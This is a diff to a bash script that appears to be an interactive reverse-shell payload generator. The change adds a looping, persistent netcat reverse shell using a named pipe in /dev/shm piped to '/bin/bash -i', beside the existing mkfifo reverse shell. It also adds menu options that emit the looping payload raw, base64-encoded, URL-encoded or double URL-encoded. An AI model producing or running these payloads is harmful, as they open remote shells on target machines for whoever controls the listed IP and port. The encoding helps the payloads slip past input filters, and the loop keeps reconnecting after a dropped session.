@@ -169,7 +169,13 @@ listen
 
 function netcat () {
 header
-rev="rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh"
+
+if [[ $2 == "loop" ]] 
+then
+    rev="while true; do sleep 10 && mknod /dev/shm/p p; cat /dev/shm/p | /bin/bash -i | $nc $IP $PORT >/dev/shm/p; done"
+else 
+    rev="rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh"
+fi
 if [[ $1 == "url" ]] 
 then
     rev=$(urlencodeme $rev)
@@ -355,7 +361,11 @@ $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
 $(greenprint '4)') Double URL encoded
-$(magentaprint '5)') Go Back to Main Menu
+$(greenprint '5)') Looping, no encoding
+$(greenprint '6)') Looping, Base64 encoded
+$(greenprint '7)') Looping, URL encoded
+$(greenprint '8)') Looping, double URL encoded
+$(magentaprint '9)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -374,6 +384,18 @@ Choose an option:  "
         netcat "urlx2"
         ;;
     5)
+        netcat "" "loop"
+        ;;
+    6)
+        netcat "base64" "loop"
+        ;;
+    7)
+        netcat "url" "loop"
+        ;;
+    8)
+        netcat "urlx2" "loop"
+        ;;
+    9)
         mainmenu
         ;;
     0)
